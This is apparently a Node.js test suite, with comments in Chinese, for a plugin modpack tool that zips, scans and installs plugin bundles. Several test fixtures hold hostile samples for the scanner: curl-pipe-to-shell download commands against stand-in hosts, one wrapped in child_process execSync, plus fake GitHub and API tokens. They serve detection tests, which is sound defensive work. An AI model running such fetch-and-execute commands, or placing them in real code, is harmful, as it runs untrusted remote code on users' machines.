/**
 * dsh-modpack 自测：只依赖 node 内置模块，不碰真实 profile。
 * 运行：node test/run.mjs
 */
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { writeZip, readZip } from '../lib/zip.mjs'
import { satisfies, compareVersions } from '../lib/semver.mjs'
import { scanEntries, scanFile, groupFindings } from '../lib/scan.mjs'
import { parseYaml, emitYaml, upsertPatchItem } from '../lib/yamlish.mjs'
import { normalizeManifest } from '../lib/manifest.mjs'
import { checkCompatibility } from '../lib/compat.mjs'
import { buildPack, PackRefused } from '../lib/pack.mjs'
import { inspectPackBuffer, installPack } from '../lib/install.mjs'
import { DEFAULT_CONFIG } from '../lib/store.mjs'

const results = []
let failed = 0

function test(name, fn) {
  try {
    const value = fn()
    if (value && typeof value.then === 'function') throw new Error('异步测试请用 testAsync')
    results.push(['ok', name, ''])
  } catch (error) {
    failed++
    results.push(['FAIL', name, String((error && error.stack) || error)])
  }
}

async function testAsync(name, fn) {
  try {
    await fn()
    results.push(['ok', name, ''])
  } catch (error) {
    failed++
    results.push(['FAIL', name, String((error && error.stack) || error)])
  }
}

function assert(cond, message) {
  if (!cond) throw new Error(message || '断言失败')
}

function assertEqual(actual, expected, message) {
  const a = JSON.stringify(actual)
  const b = JSON.stringify(expected)
  if (a !== b) throw new Error((message || '不相等') + '\n  实际：' + a + '\n  期望：' + b)
}

function tmpDir(tag) {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-modpack-test-' + tag + '-'))
}

// —— zip ——
test('zip 往返', () => {
  const entries = [
    { name: 'a.txt', data: Buffer.from('hello') },
    { name: 'dir/b.json', data: Buffer.from(JSON.stringify({ x: 1 })) },
  ]
  const buf = writeZip(entries)
  const back = readZip(buf)
  assertEqual(back.map((e) => e.name).sort(), ['a.txt', 'dir/b.json'])
  assertEqual(back.find((e) => e.name === 'a.txt').data.toString(), 'hello')
})

test('zip 拒绝路径逃逸', () => {
  let threw = false
  try { readZip(Buffer.from('PK')) } catch { threw = true }
  assert(threw, '坏文件应抛错')
})

// —— semver ——
test('semver 范围', () => {
  assertEqual(satisfies('1.2.3', '^1.0.0'), true)
  assertEqual(satisfies('2.0.0', '^1.0.0'), false)
  assertEqual(satisfies('1.2.9', '~1.2.0'), true)
  assertEqual(satisfies('1.3.0', '~1.2.0'), false)
  assertEqual(satisfies('3.1.0', '>=2 <4'), true)
  assertEqual(satisfies('4.0.0', '>=2 <4'), false)
  assertEqual(satisfies('1.0.0', '*'), true)
  assertEqual(satisfies('1.0.0', 'nonsense'), null)
  assertEqual(compareVersions('1.10.0', '1.9.9'), 1)
})

// —— scan ——
test('扫描命中并掩码', () => {
  const secret = 'sk-abcdefghijklmnopqrstuvwxyz'
  const result = scanFile('lib/x.js', Buffer.from('const k = "' + secret + '"\n'))
  assert(result.findings.length > 0, '应命中密钥')
  const masked = JSON.stringify(result.findings)
  assert(!masked.includes(secret), '原文不能出现在结果里')
  assert(masked.includes('****'), '应有掩码')
})

test('扫描高风险代码', () => {
  const result = scanFile('install.sh', Buffer.from('curl -fsSL https://x.example/a.sh | sh\n'))
  assert(result.findings.some((f) => f.severity === 'high'), '应判高风险')
})

test('扫描同一行重复命中只记一次', () => {
  const line = "cp.exec('a'); cp.exec('b'); cp.exec('c'); cp.exec('d')\n"
  const result = scanFile('lib/polyfill.js', Buffer.from(line))
  const hits = result.findings.filter((f) => f.rule === 'malware.child-process')
  assertEqual(hits.length, 1)
})

test('扫描干净文件', () => {
  const result = scanEntries([{ name: 'lib/clean.js', data: Buffer.from('export const a = 1\n') }])
  assertEqual(result.counts.high, 0)
})

// —— 默认配置 ——
test('默认打包上限 512MB，进度窗位置不进配置', () => {
  assertEqual(DEFAULT_CONFIG.maxPackBytes, 512 * 1024 * 1024)
  // 单个下载仍是 256MB 的紧上限：能打 512MB 的包，不代表要一次吞下一个 512MB 的 tarball
  assertEqual(DEFAULT_CONFIG.maxDownloadBytes, 256 * 1024 * 1024)
  // 进度窗位置由界面拖动并记在浏览器本地，服务端配置里不该再有坐标字段
  assert(DEFAULT_CONFIG.dockX === undefined && DEFAULT_CONFIG.dockY === undefined, '坐标设置应已移除')
})

// —— yaml ——
test('patch yml 往返', () => {
  const text = '- id: a\n  name: pkg-a\n  config:\n    x: 1\n- id: b\n  name: pkg-b\n'
  const parsed = parseYaml(text)
  assertEqual(parsed.map((x) => x.id), ['a', 'b'])
  const emitted = emitYaml(parsed, 0)
  assertEqual(parseYaml(emitted), parsed)
})

test('patch yml upsert 保留其它条目', () => {
  const text = '- id: a\n  name: pkg-a\n  config:\n    x: 1\n\n- id: b\n  name: pkg-b\n  config:\n    y: 2\n'
  const replaced = upsertPatchItem(text, { id: 'a', name: 'pkg-a', config: { x: 9 } })
  assertEqual(replaced.action, 'replaced')
  const after = parseYaml(replaced.text)
  assertEqual(after.find((x) => x.id === 'a').config, { x: 9 })
  assertEqual(after.find((x) => x.id === 'b').config, { y: 2 })
  const inserted = upsertPatchItem(text, { id: 'c', name: 'pkg-c', config: { z: 3 } })
  assertEqual(inserted.action, 'inserted')
  assertEqual(parseYaml(inserted.text).map((x) => x.id), ['a', 'b', 'c'])
})

// —— manifest ——
test('清单规范校验', () => {
  let threw = false
  try { normalizeManifest({ schema: 1, kind: 'nope', plugins: [] }) } catch { threw = true }
  assert(threw, '错误的 kind 应被拒')
  const ok = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    name: 'demo',
    format: 'full',
    plugins: [{ name: 'a', version: '1.0.0' }],
  })
  assertEqual(ok.plugins.length, 1)
  let dup = false
  try {
    normalizeManifest({ schema: 1, kind: 'dsh-modpack', name: 'demo', format: 'full', plugins: [{ name: 'a', version: '1.0.0' }, { name: 'a', version: '2.0.0' }] })
  } catch { dup = true }
  assert(dup, '清单里重复插件应被拒（来源可疑）')
})

// —— compat ——
test('兼容性：缺 peer 与 engines', () => {
  const compat = checkCompatibility([
    { name: 'p', version: '1.0.0', peerDependencies: { 'other-pkg': '^2.0.0' }, engines: { dsh: '>=99' } },
  ], { installed: [], dshVersion: '1.0.0', nodeVersion: '20.0.0', config: { licenseAllow: ['MIT'] } })
  assert(compat.findings.some((f) => f.code && /peer/iu.test(f.code)), '应报 peer 问题')
  assert(compat.findings.some((f) => f.message.includes('other-pkg')), '消息里应有包名')
})

// —— 端到端：打包 → 读回 → 演练安装 ——
async function fixture() {
  const home = tmpDir('home')
  process.env.DSH_HOME = home
  const profileDir = path.join(home, 'profiles', 'desktop')
  fs.mkdirSync(profileDir, { recursive: true })
  fs.writeFileSync(path.join(profileDir, 'package.json'), JSON.stringify({
    name: 'desktop',
    private: true,
    dependencies: {},
    dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), '- id: demo\n  name: demo-plugin\n  config:\n    greeting: hi\n')

  const pluginDir = path.join(profileDir, 'node_modules', 'demo-plugin')
  fs.mkdirSync(path.join(pluginDir, 'lib'), { recursive: true })
  fs.writeFileSync(path.join(pluginDir, 'package.json'), JSON.stringify({
    name: 'demo-plugin',
    version: '1.2.3',
    license: 'MIT',
    dsh: { client: { platform: 'web' } },
    exports: { './client': './client.js' },
  }, null, 2))
  fs.writeFileSync(path.join(pluginDir, 'index.js'), 'export function apply() {}\n')
  fs.writeFileSync(path.join(pluginDir, 'lib', 'util.js'), 'export const a = 1\n')

  const installed = [{
    name: 'demo-plugin',
    dirName: 'demo-plugin',
    version: '1.2.3',
    dir: pluginDir,
    realDir: pluginDir,
    pkg: JSON.parse(fs.readFileSync(path.join(pluginDir, 'package.json'), 'utf8')),
    isBundle: true,
    hasClient: true,
    hasPatch: false,
    size: 100,
  }]

  return { home, profileDir, pluginDir, installed }
}

const packContext = (config, profileDir, installed) => ({
  config,
  profileDir,
  dshVersion: '1.0.0',
  installed,
  pluginVersion: '0.1.0',
  parsePatch: parseYaml,
  patchText: fs.readFileSync(path.join(profileDir, 'cordis.patch.yml'), 'utf8'),
})

const baseConfig = {
  includePayload: true,
  licenseAllow: ['MIT', 'Apache-2.0'],
  blockHighRisk: true,
  maxFileBytes: 4 * 1024 * 1024,
  maxPackBytes: 64 * 1024 * 1024,
  scanBeforePack: true,
  scanBeforeInstall: true,
  historyLimit: 20,
  profile: 'desktop',
}

await testAsync('端到端：完整版打包并读回', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '测试包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  assert(result.size > 0, '应产出非空文件')
  assertEqual(result.manifest.format, 'full')
  assertEqual(result.manifest.plugins.length, 1)
  assert(result.manifest.plugins[0].configIncluded, '应抓到配置')

  const names = readZip(result.buffer).map((entry) => entry.name)
  assert(names.includes('install/install.mjs'), '完整版应带无插件也能跑的安装器 install/install.mjs')
  assert(names.includes('install/install.cmd'), '完整版应带 Windows 双击入口')
  assert(names.includes('install/install.sh'), '完整版应带 shell 入口')

  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  assertEqual(inspected.integrity.ok, true)
  assertEqual(inspected.blockingReasons.length, 0)
  assertEqual(inspected.manifest.plugins[0].version, '1.2.3')
  assertEqual(inspected.scan.scannedFiles > 0, true)
})

await testAsync('端到端：轻量版不含插件文件', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: false, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '轻量包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  assertEqual(result.manifest.format, 'lite')
  assert(!result.buffer.includes(Buffer.from('export const a = 1')), '轻量版不应带源码')
})

await testAsync('高敏感内容拒绝出包', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'bad.js'), 'const token = "ghp_' + 'a'.repeat(36) + '"\n')
  let scan = null
  try {
    await buildPack({
      selection: [{ name: 'demo-plugin', source: 'profile' }],
      options: { includePayload: true, includeConfig: false, includeLocalEdits: true, confirmLicense: false, name: '脏包' },
      context: packContext(baseConfig, profileDir, installed),
    })
  } catch (error) {
    if (error instanceof PackRefused) scan = error.scan
    else throw error
  }
  assert(scan, '应抛 PackRefused')
  assert(scan.counts.high > 0, '应有高风险项')
})

await testAsync('打包前扫描强制：传 scanBeforePack=false 也照扫', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'bad.js'), 'const token = "ghp_' + 'b'.repeat(36) + '"\n')
  let scan = null
  try {
    await buildPack({
      selection: [{ name: 'demo-plugin', source: 'profile' }],
      options: { includePayload: true, includeConfig: false, includeLocalEdits: true, confirmLicense: false, name: '强制扫描', scanBeforePack: false },
      context: packContext(baseConfig, profileDir, installed),
    })
  } catch (error) {
    if (error instanceof PackRefused) scan = error.scan
    else throw error
  }
  assert(scan, '关不掉扫描：应抛 PackRefused')
  assert(scan.counts.high > 0, '应有高风险项')
  assert(scan.note !== '未执行扫描（调用方关闭）', '不应出现「调用方关闭」的旁路')
})

await testAsync('风险项一律先停下来等确认：市场收录的与本机都走同一条出路', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
  const ctx = packContext(baseConfig, profileDir, installed)
  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '市场包' }
  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]

  let asked = null
  try {
    await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'] }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) asked = error
    else throw error
  }
  assert(asked, '应抛 PackRefused')
  assertEqual(asked.needsAck, true)
  assertEqual(asked.trustedOnly, true)

  const ok = await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'], acknowledge: true }, context: ctx })
  assertEqual(ok.manifest.security.acknowledged, true)
  assert(ok.scan.counts.high > 0, '确认后风险仍要记录在报告里')

  let hard = null
  try {
    await buildPack({ selection, options: { ...base }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) hard = error
    else throw error
  }
  assert(hard, '未收录插件的风险项也要先停下来等确认')
  assertEqual(hard.needsAck, true)
  assertEqual(hard.trustedOnly, false)

  const untrustedOk = await buildPack({ selection, options: { ...base, acknowledge: true }, context: ctx })
  assertEqual(untrustedOk.manifest.security.acknowledged, true)
  assertEqual(untrustedOk.manifest.security.trustedOnly, false)
  assert(untrustedOk.scan.counts.high > 0, '确认后风险仍要记录在报告里')
})

await testAsync('端到端：演练安装（不落地）', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '演练包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  const install = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { dryRun: true, keepLocal: false, applyConfig: true },
    context: { profileDir },
  })
  assert(install.actions.length > 0, '应有动作记录')
  assert(install.actions.every((a) => a.ok), '演练应全部通过：' + JSON.stringify(install.actions))
})

await testAsync('逐插件模式：base 取上游原版且不打本机配置', async () => {
  const { profileDir, installed } = await fixture()
  const upstreamPkg = { name: 'demo-plugin', version: '1.2.3', license: 'MIT', dsh: { client: { platform: 'web' } } }
  const result = await buildPack({
    selection: [{
      name: 'demo-plugin',
      source: 'profile',
      mode: 'base',
      download: async () => ({
        pkg: upstreamPkg,
        registry: 'https://registry.npmjs.org',
        tarball: 'https://registry.npmjs.org/demo-plugin/-/demo-plugin-1.2.3.tgz',
        integrity: 'sha512-x',
        entries: [
          { name: 'package.json', data: Buffer.from(JSON.stringify(upstreamPkg)) },
          { name: 'index.js', data: Buffer.from('export function apply() { /* upstream */ }\n') },
        ],
      }),
    }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '基础配置包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const plugin = result.manifest.plugins[0]
  assertEqual(plugin.mode, 'base')
  assertEqual(plugin.localEdits, false)
  assertEqual(plugin.configIncluded, false, 'base 模式不应带本机配置')
  assert(result.buffer.includes(Buffer.from('/* upstream */')), '应带上游文件')
  assert(!result.buffer.includes(Buffer.from('export const a = 1')), 'base 模式不应带本机改动文件')
})

await testAsync('逐插件模式：local 带本机代码与配置快照', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: false, confirmLicense: false, name: '本地改动包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const plugin = result.manifest.plugins[0]
  assertEqual(plugin.mode, 'local')
  assertEqual(plugin.configIncluded, true, 'local 模式应带本机配置')
  assert(result.buffer.includes(Buffer.from('export const a = 1')), '应带本机文件')
})

await testAsync('逐插件模式：manifest 统一带 mode 字段', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: false, includeConfig: false, name: '字段包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  assert(inspected.manifest.plugins.every((p) => p.mode === 'local' || p.mode === 'base'), 'mode 必须落到清单')
})

await testAsync('分类：按名字与描述打标签', async () => {
  const { classifyPlugin, categoryLabel } = await import('../lib/classify.mjs')
  assertEqual(classifyPlugin({ name: 'dsh-bili-tools', description: 'B站弹幕与字幕' }).id, 'media')
  assertEqual(classifyPlugin({ name: 'dsh-modpack-kit', description: '打包整合包' }).id, 'pack')
  assertEqual(classifyPlugin({ name: 'dsh-theme-neon', description: '界面主题' }).id, 'ui')
  assertEqual(classifyPlugin({ name: 'zzz', description: '' }).id, 'other')
  assertEqual(categoryLabel('pack'), '打包与分发')
  assertEqual(classifyPlugin({ title: 'MCP 开发调试器', description: 'debug 工具' }).id, 'dev')
})

await testAsync('安装：配置回填不能冲掉其它条目（回归 readPatch 返回字符串）', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, name: '回填包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  assertEqual(inspected.integrity.ok, true)

  const targetHome = tmpDir('target-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  const before = ['- id: keep-me', '  name: other-plugin', '  config:', '    x: 1', ''].join('\n')
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), before)

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: true, keepLocal: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: async () => ({ code: 0, output: 'fake cli' }) },
  })
  assertEqual(result.ok, true)
  const after = fs.readFileSync(path.join(targetProfile, 'cordis.patch.yml'), 'utf8')
  assert(after.includes('keep-me'), '别的配置条目不能被冲掉：' + after)
  assert(after.includes('greeting'), '目标插件的配置没写回去：' + after)
})

await testAsync('安装：不启用时 bundle 清单要被撤回原样', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: false, name: '不启用包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })

  const targetHome = tmpDir('bundle-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  const profileJson = path.join(targetProfile, 'package.json')
  fs.writeFileSync(profileJson, JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: ['keep-me'] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '- id: keep\n  name: keep-me\n')

  // 假的 dsh CLI：模拟 add 之后写入依赖并把自己登记进 bundles
  const fakeCli = async () => {
    const pkg = JSON.parse(fs.readFileSync(profileJson, 'utf8'))
    pkg.dependencies['demo-plugin'] = 'file:' + path.join(targetProfile, 'node_modules', 'demo-plugin')
    const bundles = new Set(pkg.dsh.profile.bundles)
    bundles.add('demo-plugin')
    pkg.dsh.profile.bundles = [...bundles]
    fs.writeFileSync(profileJson, JSON.stringify(pkg, null, 2))
    return { code: 0, output: 'fake cli added' }
  }

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: fakeCli },
  })
  assertEqual(result.ok, true)
  const after = JSON.parse(fs.readFileSync(profileJson, 'utf8'))
  assert(after.dependencies['demo-plugin'], '依赖应该照常写入')
  assertEqual(after.dsh.profile.bundles.length, 1, 'bundles 里只应剩原来的 keep-me')
  assertEqual(after.dsh.profile.bundles[0], 'keep-me')
})

await testAsync('风险按来源分组：插件、配置、整合包分栏列', async () => {
  const findings = [
    { rule: 'secret.private-key', severity: 'high', file: 'plugins/demo-plugin/lib/x.js', line: 3, label: '私钥', masked: 'PR****' },
    { rule: 'secret.email', severity: 'low', file: 'configs/demo-plugin.json', line: 1, label: '邮箱', masked: 'a****' },
    { rule: 'file.credential-name', severity: 'medium', file: 'dsh-modpack.json', line: 0, label: '凭证名', masked: '***' },
    { rule: 'malware.eval', severity: 'medium', file: 'plugins/demo-plugin/index.js', line: 9, label: 'eval', masked: '***' },
  ]
  const groups = groupFindings(findings, [{ name: 'demo-plugin', source: 'profile' }])
  assert(groups.length >= 2, '应按文件位置分成多组')
  const pluginGroup = groups.find((g) => g.key === 'plugin:demo-plugin')
  assert(pluginGroup, '应有 demo-plugin 这一组')
  assertEqual(pluginGroup.counts.high, 1)
  assertEqual(pluginGroup.findings.length, 2, '同一插件的两处命中应归在一组')
  assertEqual(pluginGroup.origin, 'local')
  const configGroup = groups.find((g) => g.key.startsWith('config:'))
  assert(configGroup, '配置应单独成组')
  const packGroup = groups.find((g) => g.key === 'pack')
  assert(packGroup, '整合包自身的命中单独成组')
  assertEqual(groups[0].key, pluginGroup.key, '高危的组排在最前')
})

await testAsync('轻量版也带安装器（无插件 DSH 能读能装）', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: false, includeConfig: true, confirmLicense: false, name: '轻量安装器包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const names = readZip(result.buffer).map((entry) => entry.name)
  assert(names.includes('install/install.mjs'), '轻量版同样要有安装器')
  const readme = readZip(result.buffer).find((entry) => entry.name === 'README.txt')
  assert(readme, '应有 README')
  const text = readme.data.toString('utf8')
  assert(text.includes('install'), 'README 应说明安装器用法')
})

await testAsync('安装器不认 --home，也不把解压目录当长期来源', async () => {
  const stub = fs.readFileSync(new URL('../assets/install-stub.mjs', import.meta.url), 'utf8')
  assert(!stub.includes('--home'), '安装器不该暴露 --home：DSH 命令行只认 ~/.dsh，留这个参数会写错位置')
  assert(stub.includes('vendorRoot'), '完整版应先把插件复制到 vendor 再装')
  assert(stub.includes("'dsh-modpack', 'vendor'") || stub.includes('"dsh-modpack", "vendor"'), 'vendor 目录应在 ~/.dsh/dsh-modpack/vendor 下')
})

await testAsync('客户端组件在假 React 下能渲染（抓未定义变量这类白屏）', async () => {
  const source = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const override = { value: undefined, used: false }
  const React = {
    createElement: (type, props, ...children) => ({ el: true, type, props: props || {}, children: children.flat(Infinity) }),
    useState: (init) => {
      let value = typeof init === 'function' ? init() : init
      if (!override.used && override.value !== undefined) {
        value = override.value
        override.used = true
      }
      return [value, () => {}]
    },
    useEffect: () => {},
    useLayoutEffect: () => {},
    useCallback: (fn) => fn,
    useMemo: (fn) => fn(),
    useRef: (value) => ({ current: value }),
    Fragment: 'fragment',
  }
  let mod = null
  const win = { __ModuleLoader__: { load: ({ factory }) => { mod = factory((name) => {
    if (name === 'react') return React
    throw new Error('unexpected require: ' + name)
  }) } } }
  const doc = { createElement: () => ({}), head: { appendChild() {} }, body: {} }
  new Function('window', 'document', source)(win, doc)
  assert(mod && typeof mod.Home === 'function', 'client.js 应导出 Home')

  const render = (node, depth = 0) => {
    if (depth > 400) throw new Error('渲染深度超限（可能组件互相递归）')
    if (node === null || node === undefined || typeof node === 'boolean') return
    if (typeof node === 'string' || typeof node === 'number') return
    if (Array.isArray(node)) { for (const child of node) render(child, depth + 1); return }
    if (!node.el) return
    if (typeof node.type === 'function') {
      render(node.type({ ...node.props, children: node.children.length === 1 ? node.children[0] : node.children }), depth + 1)
      return
    }
    for (const child of node.children) render(child, depth + 1)
  }

  const status = {
    ok: true, dshVersion: '0.0.0', pluginVersion: '0.1.3', profile: 'desktop',
    installed: [], installedTotal: 0, bundled: [], history: [],
    catalog: { present: false, categories: [], count: 0, pageSizeDefault: 20 },
    config: { catalogPageSize: 20, catalogRefreshHours: 24, showInSettings: true, showInSidebar: true, showInPluginsTab: false, enableOnInstall: false },
    placements: { settings: true, sidebar: true, pluginsTab: false },
    market: { installed: false },
  }
  render(mod.Home({ status }))
  render(mod.Icon({ size: 16 }))
  render(mod.Page({}))
  for (const tab of ['install', 'settings']) {
    override.value = tab
    override.used = false
    render(mod.Home({ status }))
  }
})

await testAsync('确认后从检测点续跑：不重新收集、也不重复检测', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
  const ctx = packContext(baseConfig, profileDir, installed)
  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '续跑包' }
  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]

  let refused = null
  try {
    await buildPack({ selection, options: { ...base }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) refused = error
    else throw error
  }
  assert(refused, '应抛 PackRefused')
  assert(refused.checkpoint, '被拦下时要留下可复用的中间结果')

  const stages = []
  const resumed = await buildPack({
    selection,
    options: { ...base, acknowledge: true, resume: refused.checkpoint, onProgress: (p) => stages.push(p.stage) },
    context: ctx,
  })
  assert(!stages.includes('collect'), '续跑不应重新收集文件，实际阶段：' + stages.join(','))
  assertEqual(resumed.manifest.security.acknowledged, true)
  assertEqual(resumed.scan.counts.high, refused.scan.counts.high)
  assert(resumed.notes.some((n) => n.includes('不重复扫描')), '续跑时应该说明没再扫一遍')
})

for (const [state, name, detail] of results) {
  if (state === 'ok') console.log('ok   ' + name)
  else console.log('FAIL ' + name + '\n' + detail)
}
console.log('\n' + (results.length - failed) + '/' + results.length + ' 通过')
process.exitCode = failed === 0 ? 0 : 1
